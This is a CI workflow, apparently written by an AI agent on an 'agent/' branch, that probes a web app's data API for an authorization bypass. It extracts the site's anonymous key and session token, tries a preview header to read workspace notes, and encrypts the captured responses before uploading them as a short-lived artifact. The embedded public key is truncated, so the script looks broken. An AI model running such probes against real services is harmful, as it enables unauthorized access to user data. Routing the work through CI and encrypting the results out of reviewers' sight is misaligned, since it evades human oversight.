name: launchlet-part2-token-probe

on:
  push:
    branches: [agent/launchlet-part2-token-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Compare workspace notes with global preview context
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests, pathlib, urllib.parse, json
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json()
          u=urllib.parse.urljoin(base,boot['api']['dataApiBase'].rstrip('/')+'/workspace_notes?select=*')
          api=boot['client']['anonKey']; sess=boot['client']['session']; p=boot['project']
          tests=[
            ('guest',{'Accept':'application/json','apikey':api,'Authorization':'Bearer '+sess}),
            ('guest_preview',{'Accept':'application/json','apikey':api,'Authorization':'Bearer '+sess,'X-Launchlet-Preview':p}),
            ('preview_only',{'Accept':'application/json','X-Launchlet-Preview':p}),
            ('preview_apikey',{'Accept':'application/json','apikey':api,'X-Launchlet-Preview':p}),
            ('preview_auth',{'Accept':'application/json','Authorization':'Bearer '+sess,'X-Launchlet-Preview':p}),
          ]
          res=[]
          for name,h in tests:
            r=s.get(u,headers=h,timeout=15,allow_redirects=False); res.append({'name':name,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
          (out/'summary.json').write_text(json.dumps(res,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key
          openssl rand 16 > package/iv.bin
          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part2-data-preview-encrypted
          path: artifact/
          retention-days: 1
